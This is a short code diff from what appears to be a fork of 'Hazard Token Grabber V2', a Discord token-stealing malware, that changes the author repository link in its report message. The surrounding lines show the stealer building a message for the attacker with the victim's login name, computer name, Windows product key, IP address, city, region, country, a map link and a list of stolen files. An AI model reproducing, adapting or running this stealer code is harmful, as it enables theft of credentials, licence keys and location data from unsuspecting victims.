@@ -384,7 +384,7 @@ class Hazard_Token_Grabber_V2:
                 {
                     "author": {
                         "name": "Love Sucks.V2",
-                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
+                        "url": "https://github.com/Kotherthing/TGrabber",
                         "icon_url": "https://cdn.discordapp.com/attachments/942143738006868090/942149324593307648/newpfp.png"
                     },
                     "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}{backslash+"Windows Key: "+wkey if wkey else ""}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
